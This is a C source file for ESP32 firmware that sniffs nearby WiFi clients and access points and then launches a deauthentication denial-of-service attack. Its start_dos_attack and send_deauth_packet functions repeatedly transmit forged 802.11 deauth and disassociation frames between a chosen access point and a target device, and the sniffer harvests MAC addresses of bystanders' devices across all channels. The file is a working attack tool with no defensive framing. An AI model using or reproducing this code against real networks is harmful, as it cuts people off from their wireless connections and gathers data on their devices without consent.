#include "deauth.h"
#include "../device_list/device_list.h"
#include <esp_err.h>
#include <stdbool.h>
#include <stdarg.h>
#include <esp_event.h>
#include <esp_wifi.h>
#include <esp_log.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include "freertos/task.h"
#include "freertos/event_groups.h"

static bool device_lists_initialized = false;
static u_int8_t current_channel;
static device_list_t *device_lists[14];
static u_int16_t ap_count = 0;
static wifi_ap_record_t *ap_records = NULL;
static TimerHandle_t deaut_timer;
deauth_info_t *deauth_info = NULL;

// Initialize the MAC lists
static void device_lists_init() {
    for (int i = 0; i < 14; i++) {
        device_lists[i] = device_list_new(i + 1);
    }
    device_lists_initialized = true;
}

// Promiscuous callback
static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type)
{
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;

    uint8_t *src_addr = pkt->payload + 10; // Source address is at offset 10
    uint8_t *dst_addr = pkt->payload + 4;  // Destination address is at offset 4

    // add the source & destination MAC address to the list
    device_list_add(src_addr, device_lists[current_channel - 1]);
    device_list_add(dst_addr, device_lists[current_channel - 1]);
}

// start sniffer, channel = 0 means all channels
esp_err_t start_sniffer(u_int8_t channel) {
    // Check input parameters
    if (channel > 14) {
        ESP_LOGE(DEAUTH_TAG, "Invalid input parameters");
        return ESP_FAIL;
    }

    // Initialize the MAC lists
    if (!device_lists_initialized) {
        device_lists_init();
    }

    // Set mode to WIFI_MODE_NULL
    if(esp_wifi_set_mode(WIFI_MODE_NULL) != ESP_OK) {
        ESP_LOGE(DEAUTH_TAG, "Failed to set wifi mode");
        return ESP_FAIL;
    }

    // Check if wifi driver is already initialized
    wifi_mode_t mode;
    esp_err_t err = esp_wifi_get_mode(&mode);
    if (err != ESP_OK) {
        ESP_LOGE(DEAUTH_TAG, "Failed to get wifi mode");
        return err;
    }

    // Initialize channel
    current_channel = channel ? channel : 1;
    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGE(DEAUTH_TAG, "Failed to set wifi channel");
        return err;
    }

    // Initialize WiFi in sniffer mode
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_callback);
    
    // Start the sniffer
    esp_wifi_set_promiscuous(true);
    ESP_LOGI(DEAUTH_TAG, "Sniffing channel: %d", current_channel);
    vTaskDelay(5000 / portTICK_PERIOD_MS);

    if(channel == 0){
        do{
            ++current_channel;
            ESP_LOGI(DEAUTH_TAG, "Sniffing channel: %d", current_channel);
            esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(5000 / portTICK_PERIOD_MS);
        } while(current_channel < 14);
    }

    esp_wifi_set_promiscuous(false);
    ESP_LOGI(DEAUTH_TAG, "Sniffer stopped");
    return ESP_OK;
}

// display all devices in a channel, if channel = 0, display all channels
esp_err_t display_devices_info(u_int8_t channel){
    // Initialize the MAC lists
    if (!device_lists_initialized) {
        device_lists_init();
    }

    if (channel == 0) {
        for (int i = 0; i < 14; i++) {
            device_list_print(device_lists[i]);
        }
    } else {
        device_list_print(device_lists[channel - 1]);
    }
    return ESP_OK;
}

// sniff all APs
esp_err_t start_sniffer_AP(){
    // Set mode to WIFI_MODE_STA
    if(esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK){
        ESP_LOGE(DEAUTH_TAG, "Failed to set wifi mode");
        return ESP_FAIL;
    }

    // Check if wifi driver is already initialized
    wifi_mode_t mode;
    esp_err_t err = esp_wifi_get_mode(&mode);
    if (err != ESP_OK) {
        ESP_LOGE(DEAUTH_TAG, "Failed to get wifi mode");
        return err;
    }

    // start scan
    if(esp_wifi_scan_start(NULL, true) != ESP_OK){
        ESP_LOGE(DEAUTH_TAG, "Failed to start scan");
        return ESP_FAIL;
    }
    ESP_LOGI(DEAUTH_TAG, "Scanning APs...");

    // get number of APs found
    if(esp_wifi_scan_get_ap_num(&ap_count) != ESP_OK){
        ESP_LOGE(DEAUTH_TAG, "Failed to get number of APs found");
        return ESP_FAIL;
    }

     // get all AP records
    ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
    if(esp_wifi_scan_get_ap_records(&ap_count, ap_records) != ESP_OK){
        ESP_LOGE(DEAUTH_TAG, "Failed to get AP records");
        return ESP_FAIL;
    }
    ESP_LOGI(DEAUTH_TAG, "Number of APs found: %d", ap_count);	

    return ESP_OK;
}

// display all APs
esp_err_t display_APs_info(){
    // print AP records
for (int i = 0; i < ap_count; i++) {
    ESP_LOGI("WIFI", "SSID: %s, RSSI: %d, Channel: %d, BSSID: %02x:%02x:%02x:%02x:%02x:%02x", 
        ap_records[i].ssid, ap_records[i].rssi, ap_records[i].primary,
        ap_records[i].bssid[0], ap_records[i].bssid[1], ap_records[i].bssid[2], 
        ap_records[i].bssid[3], ap_records[i].bssid[4], ap_records[i].bssid[5]);
}
    return ESP_OK;
}

static void send_deauth_packet(TimerHandle_t xTimer) {
    uint8_t *AP_mac = deauth_info->AP_mac;
    uint8_t *target_mac = deauth_info->target_mac;

    // Frame Control for deauth packet
    uint8_t deauth_frame_control = 0xc0;
    
    // Frame Control for disassoc packet
    uint8_t disassoc_frame_control = 0xa0;

    uint8_t packet[26] = {
        0x00, 0x00,                  // Frame Control - will be replaced later
        0x00, 0x00,                  // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC Address (Broadcast)
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, // Source MAC Address
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, // BSSID
        0x00, 0x00,                  // Sequence / Fragment number
        0x07, 0x00                   // Reason code: Class 3 frame received from nonassociated STA
    };

    for (int i = 0; i < 2; i++) { // loop twice to send packets in both directions
        // Replace the MAC addresses in the packet
        memcpy(&packet[4], i == 0 ? target_mac : AP_mac, 6);   // Destination MAC
        memcpy(&packet[10], i == 0 ? AP_mac : target_mac, 6);  // Source MAC
        memcpy(&packet[16], AP_mac, 6);    // BSSID

        // Send deauth packet
        packet[0] = deauth_frame_control;
        if (esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false) == ESP_OK) {
            ESP_LOGI(DEAUTH_TAG, "Deauth packet sent");
        }

        // Send disassoc packet
        packet[0] = disassoc_frame_control;
        if (esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false) == ESP_OK) {
            ESP_LOGI(DEAUTH_TAG, "Disassoc packet sent");
        }
    }
}

// start DoS attack
esp_err_t start_dos_attack(uint8_t *AP_mac, uint8_t *target_mac){
    // check if AP_mac and target_mac are valid
    if(AP_mac == NULL || target_mac == NULL){
        return ESP_ERR_INVALID_ARG;
    }

    // Set mode to WIFI_MODE_STA
    if(esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK){
        ESP_LOGE(DEAUTH_TAG, "Failed to set wifi mode");
        return ESP_FAIL;
    }  

    // Check if wifi driver is already initialized
    wifi_mode_t mode;
    esp_err_t err = esp_wifi_get_mode(&mode);
    if (err != ESP_OK) {
        ESP_LOGE(DEAUTH_TAG, "Failed to get wifi mode");
        return err;
    }

    // loop through AP records to find the channel of the AP
    for (int i = 0; i < ap_count; i++) {
        if(memcmp(AP_mac, ap_records[i].bssid, 6) == 0){
            // set channel
            err = esp_wifi_set_channel(ap_records[i].primary, WIFI_SECOND_CHAN_NONE);
            break;
        }
    }
    if (err != ESP_OK) {
        ESP_LOGE(DEAUTH_TAG, "Failed to set wifi channel");
        return err;
    }

    // Create the deauth_info_t structure
    deauth_info = malloc(sizeof(deauth_info_t));
    memcpy(deauth_info->AP_mac, AP_mac, 6);
    memcpy(deauth_info->target_mac, target_mac, 6);

    // Create the FreeRTOS timer
    deaut_timer = xTimerCreate("deauth_timer", pdMS_TO_TICKS(100), pdTRUE, NULL, send_deauth_packet);
    if (deaut_timer == NULL) {
        ESP_LOGE(DEAUTH_TAG, "Failed to create timer");
        free(deauth_info);
        return ESP_FAIL;
    }

    // Start the timer
    if (xTimerStart(deaut_timer, 0) != pdPASS) {
        ESP_LOGE(DEAUTH_TAG, "Failed to start timer");
        xTimerDelete(deaut_timer, 0);
        free(deauth_info);
        return ESP_FAIL;
    }
    ESP_LOGI(DEAUTH_TAG, "Deauth attack started");

    return ESP_OK;

}

// stop DoS attack
esp_err_t stop_dos_attack(){
    // stop timer
    if (xTimerStop(deaut_timer, 0) != pdPASS) {
        ESP_LOGE(DEAUTH_TAG, "Failed to stop timer");
        return ESP_FAIL;
    }

    // delete timer
    if (xTimerDelete(deaut_timer, 0) != pdPASS) {
        ESP_LOGE(DEAUTH_TAG, "Failed to delete timer");
        return ESP_FAIL;
    }

    // free info
    free(deauth_info);

    ESP_LOGI(DEAUTH_TAG, "Deauth attack stopped");

    return ESP_OK;
}
